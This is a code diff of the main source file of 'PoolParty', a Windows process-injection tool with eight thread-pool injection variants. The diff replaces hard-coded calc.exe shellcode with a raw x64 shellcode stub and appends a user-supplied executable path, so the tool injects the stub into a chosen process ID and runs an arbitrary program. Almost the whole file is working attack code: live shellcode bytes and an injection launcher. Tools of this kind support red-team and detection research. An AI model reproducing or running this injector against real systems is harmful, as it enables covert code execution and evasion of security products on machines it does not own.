@@ -1,6 +1,20 @@
 #include "PoolParty.hpp"
+#include <sstream>
+#include <iomanip>
+#include <cstring>
+#include <boost/log/trivial.hpp>
 
-unsigned char g_Shellcode[] = 
+
+//This is set to release not debbugging
+#ifdef _WIN64
+    #pragma comment(lib, "libboost_log-vc143-mt-gd-x64-1_87.lib")
+#elif defined(_WIN32)
+    #pragma comment(lib, "libboost_log-vc143-mt-gd-x32-1_87.lib")
+#else
+    #error "Unknown target platform"
+#endif
+
+unsigned char g_BaseShellcode[] =
 "\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
 "\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
 "\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
@@ -17,128 +31,122 @@ unsigned char g_Shellcode[] =
 "\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
 "\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
 "\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
-"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
+"\x24\xC3";
 
-auto g_szShellcodeSize = sizeof(g_Shellcode);
+const size_t BaseShellcodeSize = sizeof(g_BaseShellcode) - 1;
 
-void PrintUsage()
-{
-	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID>" << std::endl << std::endl <<
-		"VARIANTS:" << std::endl <<
-		"------" << std::endl << std::endl <<
-		"#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
-		"#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
-		"#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
-		"#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
-		"#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
-		"#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
-		"#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
-		"#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
-		"EXAMPLES:" << std::endl <<
-		"------" << std::endl << std::endl <<
-		"#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
-		"#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
+unsigned char* CreateCompleteShellcode(const std::string& path, size_t& completeShellcodeSize) {
+    size_t pathLen = path.length() + 1; // Include null terminator
+    completeShellcodeSize = BaseShellcodeSize + pathLen;
+    unsigned char* completeShellcode = new unsigned char[completeShellcodeSize];
+
+    std::memcpy(completeShellcode, g_BaseShellcode, BaseShellcodeSize);
+    std::memcpy(completeShellcode + BaseShellcodeSize, path.c_str(), pathLen);
+
+    return completeShellcode;
 }
 
-POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
-	if (argc < 5) {
-		PrintUsage();
-		throw std::runtime_error("Too few arguments supplied ");
-	}
+void PrintUsage() {
+    std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -path <PATH>" << std::endl << std::endl <<
+    "VARIANTS:" << std::endl <<
+        "------" << std::endl << std::endl <<
+        "#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
+        "#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
+        "#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
+        "#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
+        "#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
+        "#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
+        "#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
+        "#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
+        "EXAMPLES:" << std::endl <<
+        "------" << std::endl << std::endl <<
+        "#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
+        "#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
 
-	POOL_PARTY_CMD_ARGS CmdArgs = { 0 };
-
-	std::vector<std::string> args(argv + 1, argv + argc);
-	for (auto i = 0; i < args.size(); i++)
-	{
-		auto CmdArg = args.at(i);
-
-		if (CmdArg == "-V" || CmdArg == "--variant-id")
-		{
-			CmdArgs.VariantId = stoi(args.at(++i));
-			continue;
-		}
-		if (CmdArg == "-P" || CmdArg == "--target-pid") 
-		{
-			CmdArgs.TargetPid = stoi(args.at(++i));
-			continue;
-		}
-		if (CmdArg == "-D" || CmdArg == "--debug-privilege")
-		{
-			CmdArgs.bDebugPrivilege = TRUE;
-			continue;
-		}
-		PrintUsage();
-		throw std::runtime_error((boost::format("Invalid option: %s") % CmdArg).str());
-	}
-
-	return CmdArgs;
 }
 
-std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
-{
-	switch (VariantId)
-	{
-	case 1: 
-		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 2:
-		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 3:
-		return std::make_unique<RemoteTpWaitInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 4:
-		return std::make_unique<RemoteTpIoInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 5:
-		return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 6:
-		return std::make_unique<RemoteTpJobInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 7:
-		return std::make_unique<RemoteTpDirectInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	case 8:
-		return std::make_unique<RemoteTpTimerInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
-	default:
-		PrintUsage();
-		throw std::runtime_error("Invalid variant ID");
-	}
+POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv, std::string& path) {
+    if (argc < 7) {
+        PrintUsage();
+        throw std::runtime_error("Too few arguments supplied");
+    }
+
+    POOL_PARTY_CMD_ARGS CmdArgs = { 0 };
+    std::vector<std::string> args(argv + 1, argv + argc);
+
+    for (size_t i = 0; i < args.size(); i++) {
+        auto CmdArg = args.at(i);
+        if (CmdArg == "-V" || CmdArg == "--variant-id") {
+            CmdArgs.VariantId = std::stoi(args.at(++i));
+        }
+        else if (CmdArg == "-P" || CmdArg == "--target-pid") {
+            CmdArgs.TargetPid = std::stoi(args.at(++i));
+        }
+        else if (CmdArg == "-path") {
+            path = args.at(++i);
+        }
+        else {
+            PrintUsage();
+            throw std::runtime_error("Invalid option: " + CmdArg);
+        }
+    }
+
+    return CmdArgs;
 }
 
-void InitLogging() 
-{
-	logging::add_console_log(
-		std::cout,
-		keywords::format =
-		(
-			logging::expressions::stream
-			<< "[" << logging::expressions::attr<logging::trivial::severity_level>("Severity")
-			<< "]    " << logging::expressions::smessage
-		)
-	);
-
-	logging::core::get()->set_filter(logging::trivial::severity >= logging::trivial::info);
+std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid, unsigned char* shellcode, size_t shellcodeSize) {
+    switch (VariantId) {
+    case 1:
+        return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, shellcode, shellcodeSize);
+    case 2:
+        return std::make_unique<RemoteTpWorkInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 3:
+        return std::make_unique<RemoteTpWaitInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 4:
+        return std::make_unique<RemoteTpIoInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 5:
+        return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 6:
+        return std::make_unique<RemoteTpJobInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 7:
+        return std::make_unique<RemoteTpDirectInsertion>(TargetPid, shellcode, shellcodeSize);
+    case 8:
+        return std::make_unique<RemoteTpTimerInsertion>(TargetPid, shellcode, shellcodeSize);
+    default:
+        PrintUsage();
+        throw std::runtime_error("Invalid variant ID");
+    }
 }
 
-
-int main(int argc, char** argv)
+void InitLogging()
 {
-	InitLogging();
+    // Basic console logging with severity level
+    logging::add_console_log(
+        std::cout,
+        keywords::format = (
+            logging::expressions::stream
+            << "[" << logging::expressions::attr<int>("Severity")
+            << "]    " << logging::expressions::smessage
+            )
+    );
+    logging::core::get()->set_filter(logging::trivial::severity >= logging::trivial::info);
+}
 
-	try 
-	{
-		const auto CmdArgs = ParseArgs(argc, argv);
-
-		if (CmdArgs.bDebugPrivilege)
-		{
-			w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE);
-			BOOST_LOG_TRIVIAL(info) << "Retrieved SeDebugPrivilege successfully";
-		}
-
-		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid);
-		Injector->Inject();
-	}
-	catch (const std::exception& ex) 
-	{
-		BOOST_LOG_TRIVIAL(error) << ex.what();
-		return 0;
-	}
-	
-	return 1;
+int main(int argc, char** argv) {
+    InitLogging();
+    try {
+        std::string path;
+        const auto CmdArgs = ParseArgs(argc, argv, path);
+        size_t completeShellcodeSize;
+        unsigned char* completeShellcode = CreateCompleteShellcode(path, completeShellcodeSize);
+        const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid, completeShellcode, completeShellcodeSize);
+        Injector->Inject();
+        delete[] completeShellcode;
+    }
+    catch (const std::exception& ex) {
+        logging::trivial::severity_level errorSeverity = logging::trivial::error;
+        BOOST_LOG_TRIVIAL(error) << ex.what();
+        return 0;
+    }
+    return 1;
 }
